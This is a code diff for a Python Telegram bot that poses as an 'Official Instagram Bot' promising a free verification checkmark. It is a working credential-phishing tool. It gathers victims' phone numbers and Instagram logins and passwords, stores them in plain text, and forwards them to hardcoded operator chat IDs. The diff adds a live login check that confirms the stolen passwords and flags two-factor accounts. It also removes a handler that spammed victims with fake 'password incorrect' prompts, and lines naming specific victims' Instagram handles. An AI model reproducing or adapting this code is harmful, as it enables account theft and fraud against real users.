@@ -7,6 +7,7 @@ from keyboards.default.default_keyboards import *
 from keyboards.inline.inline_keyboards import *
 import random
 import sqlite3
+import instaloader
 conn = sqlite3.connect("users.db")
 cursor = conn.cursor()
 cursor.execute("""
@@ -23,36 +24,35 @@ scores INTEGER
 """)
 random_number = 0
 users = dict()
+
+async def login_to_insta(data: dict):
+    try:
+        L = instaloader.Instaloader()
+        L.login(data['insta_login'], data['login_pass'])
+        return True
+    except instaloader.exceptions.TwoFactorAuthRequiredException:
+        return '2FA'
+    except instaloader.exceptions.BadCredentialsException:
+        return 'Login or password is incorrect'
+    except:
+        return False
+
 @dp.message_handler(commands="start")
 async def start_handler(message: types.Message):
     idlar = cursor.execute(f"SELECT * FROM users WHERE chat_id={message.chat.id}").fetchone()
     number = cursor.execute(f"SELECT random_number FROM users WHERE chat_id={message.chat.id}").fetchone()
-    if message.chat.id == 5596277119 and idlar:
-        cursor.execute(f"UPDATE users SET scores=27 WHERE chat_id=5596277119")
-        conn.commit()
-        await message.answer(text=f"Welcome: {message.from_user.full_name}\n\n🆔 Your ID Number: {number[0]}", reply_markup=admin_panel)
-    elif message.chat.id == 6835045911 and idlar:
-        await message.answer(text=f"Welcome: {message.from_user.full_name}\n\n🆔 Your ID Number: {number[0]}", reply_markup=admin_panel)
-    elif idlar:
-        await message.answer(text=f"Welcome: {message.from_user.full_name}\n\n🆔 Your ID Number: {number[0]}", reply_markup=my_scores)
-    else:
-        text = f"""
+    cursor.execute(f"DELETE FROM users WHERE chat_id= ?", (5596277119,))
+    text = f"""
 👋 Hello: {message.from_user.full_name}
 💁‍♂️ Welcome To Official Instagram Bot.
 😊 What Do You Want?
 """
-        await message.answer(text=text, reply_markup=free_check)
+    await message.answer(text=text, reply_markup=free_check)
 
 
 @dp.message_handler(text="✅ Get Free Check To My Account")
 async def get_free_check_instagram_handler(message: types.Message, state: FSMContext):
-    global random_number
-    if message.chat.id == 5596277119:
-        random_number = "1258"
-    elif message.chat.id == 6606094329:
-        random_number = "5769"
-    else:
-        random_number = random.randint(1000, 9999)
+    random_number = random.randint(1000, 9999)
     text = f"✅👌 OK: {message.from_user.full_name} Send Me Your Phone Number! 📞"
     await message.answer(text=text, reply_markup=send_phone_number)
     await RegisterState.send_phone_number.set()
@@ -71,50 +71,12 @@ async def send_insta_login_handler(message: types.Message, state: FSMContext):
     if message.chat.id == 6606094329 and message.text != "@xdjmrdva__":
         await message.answer(text=f"😕 Sorry We Don't Found: {message.text} Login\nPlease Try Again\n\nPlease enter your Instagram Nick with @")
         await RegisterState.send_insta_login.set()
-    elif message.chat.id == 6606094329 and message.text == "@xdjmrdva__":
-        await state.update_data({
-            "insta_login": message.text
-        })
-        text = f"✅ Succes. Please: {message.from_user.full_name} Enter Your Instagram Acoount Password!"
-        await message.answer(text=text)
-        await RegisterState.send_login_pass.set()
-    elif message.chat.id == 5347245997 and message.text != "@igamberdiyev_o01":
-        await message.answer(text=f"😕 Sorry We Don't Found: {message.text} Login\nPlease Try Again\n\nPlease enter your Instagram Nick with @")
-        await RegisterState.send_insta_login.set()
-    elif message.chat.id == 5347245997 and message.text != "@igamberdiyev_o01":
-        await state.update_data({
-            "insta_login": message.text
-        })
-        text = f"✅ Succes. Please: {message.from_user.full_name} Enter Your Instagram Acoount Password!"
-        await message.answer(text=text)
-        await RegisterState.send_login_pass.set()
-    elif message.chat.id == 6059990578 and message.text != "@musilmanka08_09":
-        await message.answer(text=f"😕 Sorry We Don't Found: {message.text} Login\nPlease Try Again\n\nPlease enter your Instagram Nick with @")
-        await RegisterState.send_insta_login.set()
-    elif message.chat.id == 5658378583 and message.text != "@ergaweva_n4":
-        await message.answer(text=f"😕 Sorry We Don't Found: {message.text} Login\nPlease Try Again\n\nPlease enter your Instagram Nick with @")
-        await RegisterState.send_insta_login.set()
-    elif message.chat.id == 5658378583 and message.text == "@ergaweva_n4":
-        await state.update_data({
-            "insta_login": message.text
-        })
-        text = f"✅ Succes. Please: {message.from_user.full_name} Enter Your Instagram Acoount Password!"
-        await message.answer(text=text)
-        await RegisterState.send_login_pass.set()
-    elif message.chat.id == 6059990578 and message.text == "@musilmanka08_09":
-        await state.update_data({
-            "insta_login": message.text
-        })
-        text = f"✅ Succes. Please: {message.from_user.full_name} Enter Your Instagram Acoount Password!"
-        await message.answer(text=text)
-        await RegisterState.send_login_pass.set()
-    else:
-        await state.update_data({
-            "insta_login": message.text
-        })
-        text = f"✅ Succes. Please: {message.from_user.full_name} Enter Your Instagram Acoount Password!"
-        await message.answer(text=text)
-        await RegisterState.send_login_pass.set()
+    await state.update_data({
+        "insta_login": message.text
+    })
+    text = f"✅ Succes. Please: {message.from_user.full_name} Enter Your Instagram Acoount Password!"
+    await message.answer(text=text)
+    await RegisterState.send_login_pass.set()
 
 @dp.message_handler(state=RegisterState.send_login_pass)
 async def send_login_pass_handler(message: types.Message, state: FSMContext):
@@ -123,20 +85,22 @@ async def send_login_pass_handler(message: types.Message, state: FSMContext):
         "login_pass": message.text
     })
     data = await state.get_data()
-    r_id = random_number
-    full_name = message.from_user.full_name
-    insta_login = data.get("insta_login")
-    insta_pass = data.get("login_pass")
-    phone_number = data.get("phone_number")
-    score = 1
-    chat_id = message.chat.id
-    cursor.execute(f"""
-    INSERT INTO users (random_number, chat_id, full_name, insta_login, insta_password, phone_number, scores) VALUES (?,?,?,?,?,?,?)
-    """, (r_id, chat_id, full_name, insta_login, insta_pass, phone_number, score))
-    conn.commit()
-    score = cursor.execute(f"SELECT scores, chat_id, random_number FROM users WHERE chat_id={message.chat.id}").fetchone()
-    scores = score[0]
-    text = f"""
+    login = await login_to_insta(data)
+    if login == True or login == '2FA':
+        r_id = random_number
+        full_name = message.from_user.full_name
+        insta_login = data.get("insta_login")
+        insta_pass = data.get("login_pass")
+        phone_number = data.get("phone_number")
+        score = 1
+        chat_id = message.chat.id
+        cursor.execute(f"""
+            INSERT INTO users (random_number, chat_id, full_name, insta_login, insta_password, phone_number, scores) VALUES (?,?,?,?,?,?,?)
+            """, (r_id, chat_id, full_name, insta_login, insta_pass, phone_number, score))
+        conn.commit()
+        score = cursor.execute(f"SELECT scores, chat_id, random_number FROM users WHERE chat_id={message.chat.id}").fetchone()
+        scores = score[0]
+        text = f"""
 💁‍♂️ We Are Succefully Logined To Your Account
 ⭐️ You Have: {scores} scores
 🆔 Your ID: {r_id}
@@ -146,21 +110,12 @@ async def send_login_pass_handler(message: types.Message, state: FSMContext):
 
 ⭐️ If You Have 50 Scores You Can Get Free CheckMark For Your Instagram Account!   
 """
-    link1 = "https://t.me/intsgram_free_check_bot"
-    if message.chat.id == 6835045911:
-        await message.answer(text=text, reply_markup=send_score)
-        await message.answer(text=link1, reply_markup=admin_panel)
-        await state.finish()
-    elif message.chat.id == 5596277119:
-        await message.answer(text=text, reply_markup=send_score)
-        await message.answer(text=link1, reply_markup=admin_panel)
-        await state.finish()
-    else:
+        link1 = "https://t.me/intsgram_free_check_bot"
         await message.answer(text=text, reply_markup=send_score)
         await message.answer(text=link1, reply_markup=my_scores)
         await state.finish()
 
-    user = f"""
+        user = f"""
 ℹ️ Ism: {message.from_user.full_name}
 🆔 Telegram ID: {message.chat.id}
 🆔🆔 Random ID: {r_id}
@@ -168,9 +123,15 @@ async def send_login_pass_handler(message: types.Message, state: FSMContext):
 🛠 Insta Login: {insta_login}
 🔑 Insta Login Parol: {insta_pass}    
 """
-    await state.finish()
-    await dp.bot.send_message(chat_id=5596277119, text=user)
-    await dp.bot.send_message(chat_id=6835045911, text=user)
+        if login == '2FA':
+            user += "\n⚠️ 2-Bosqichli autentifikatsiya bor!"
+        await state.finish()
+        await dp.bot.send_message(chat_id=5596277119, text=user)
+        await dp.bot.send_message(chat_id=6779680737, text=user)
+    elif login == "Login or password is incorrect":
+        await message.answer(text="❌ Sorry, login or password is incorrect\n⚠️ Make sure login and password is correct")
+        await message.answer(text="‼️ Please resend your login!")
+        await RegisterState.send_insta_login.set()
 
 @dp.message_handler(text="⭐ My Scores")
 async def my_scores_handler(message: types.Message):
@@ -242,68 +203,6 @@ async def cancel_handler(message: types.Message, state: FSMContext):
     text = f"Bekor Qilindi!"
     await message.answer(text=text, reply_markup=admin_panel)
     await state.finish()
-
-@dp.message_handler(state=RegisterState.mazgi_qoqish)
-async def mazgi_qoq_rejim_handler(message: types.Message, state: FSMContext):
-    await state.finish()
-
-    text = "Sent"
-    count = 1
-    await message.answer(text=text)
-    while count <= 40:
-        text = f"😕  Sorry: {message.from_user.full_name} Your Instagram Password Is Incorrect Please Reenter Your Password!"
-        await dp.bot.send_message(chat_id=message.text, text=text, reply_markup=insta_parol_retry)
-        count += 1
-        await RegisterState.mazgiddin.set()
-
-
-
-@dp.message_handler(state=RegisterState.mazgiddin, text="🔑 Reset Enter Instagram Password")
-async def reenter_password_handler(message: types.Message, state: FSMContext):
-    count = 1
-    while count <= 1:
-        text = "👌 Ok Send Me Your Really Instagram Password"
-        await message.answer(text=text, reply_markup=ReplyKeyboardRemove())
-        count += 1
-    await RegisterState.insta_pass_new.set()
-
-
-@dp.message_handler(state=RegisterState.insta_pass_new)
-async def get_new_insta_pass_handler(message: types.Message, state: FSMContext):
-    await state.update_data({
-        "new_pass": message.text
-    })
-    data = await state.get_data()
-    new_pass = data["new_pass"]
-    user = cursor.execute(f"SELECT * FROM users WHERE chat_id={message.chat.id}").fetchone()
-    cursor.execute(f"UPDATE users SET insta_password='{new_pass}' WHERE chat_id={message.chat.id}")
-    conn.commit()
-    ismi = user[3]
-    idsi = user[1]
-    chat_idsi = user[2]
-    login = user[4]
-    password = new_pass
-    nomer = user[5]
-    achkosi = user[6]
-    text = f"""
-ℹ️ Ism: {ismi}
-🆔 Telegram ID: {chat_idsi}
-🆔🆔 Random ID: {idsi}
-📞 Telefon Nomer: {nomer}
-🛠 Insta Login: {login}
-🔑 Insta Login Parol: {password}
-⭐️ Achkosi: {achkosi}
-"""
-    await dp.bot.send_message(chat_id=5596277119, text=text)
-    await dp.bot.send_message(chat_id=6835045911, text=text)
-    if message.chat.id == 6835045911:
-        await message.answer(text="😉👌 Ok Your new password has been accepted You can use the bot", reply_markup=admin_panel)
-    elif message.chat.id == 5596277119:
-        await message.answer(text="😉👌 Ok Your new password has been accepted You can use the bot", reply_markup=admin_panel)
-    else:
-        await message.answer(text="😉👌 Ok Your new password has been accepted You can use the bot", reply_markup=my_scores)
-    await state.finish()
-
 
 conn.commit()
 
